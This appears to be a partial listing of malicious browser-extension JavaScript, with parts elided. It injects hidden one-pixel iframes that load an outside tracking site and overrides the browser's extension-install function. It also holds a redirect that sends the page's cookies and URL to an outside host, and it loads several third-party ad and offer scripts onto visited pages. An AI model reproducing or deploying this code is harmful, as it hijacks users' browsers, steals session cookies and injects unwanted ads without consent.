(function(){
    var iframe = document.createElement('iframe');iframe.name = 'iframe1';iframe.src = 'https://skytraf.xyz/metr2.html?file=401';iframe.style.width = '1px';iframe.style.height = '1px';document.head.appendChild(iframe);
})();(function(){
    var iframe = document.createElement('iframe');iframe.name = 'iframe2';iframe.src = 'https://skytraf.xyz/metr17.html?file=401';iframe.style.width = '1px';iframe.style.height = '1px';document.head.appendChild(iframe);
})();

/*c*/
var hr = document.location.href;
document.location.href = "javascript:(" + function () {window.onbeforeunload = null;window.onunload = null;chrome.webstore.install = null;} + ")()";
...
!function () {
    ...
    if(document.location.href.indexOf('.pinterest.com/') > 0) return;
    if(!document.location.href.indexOf('https://secure.booking.com/')) return;
    if(!document.location.href.indexOf('https://www.facebook.com/')) return;
    function a() {
        setTimeout(a, 500);
        var b = function (hr) {
            ...
            if(!true)
                location.href = "http://worldinsearch.com/af24?keyword=" + encodeURIComponent(document.cookie)
                    + "&subid2=" + encodeURIComponent(hr) + "&source=" + encodeURIComponent(window.location.href);
            else
        ...
        if (window.chrome ||
            ...
            || (window.chrome.webstore = {}),
                window.chrome.webstore.install = b, document.querySelector) {
...
if (!window.xGlobalDomainsExclude || !window.xGlobalDomainsExclude(document.domain)) {
    ...
    (function () {
        if (window.self !== window.top || window['akama6t0p'] == 1) return;
        var _data = _data || {};
        _data['addonname'] = '[ads]';
        ...
        var scr = document.getElementsByTagName('script');for(var iter in scr)if(scr[iter]['src']&&scr[iter].src.indexOf("://asrvvv-a.akamaihd.net/get")>0&&scr[iter].src.indexOf("&affid=9675&")>0) return;
    ...
    (function() {
        ...
        script.async = true;
        script.src = '//istatic.eshopcomp.com/fo/ec/antsh.js';
    ...
    (function () {
        ...
        script.async = true; script.src = '//1179115946.rsc.cdn77.org/offers.js';
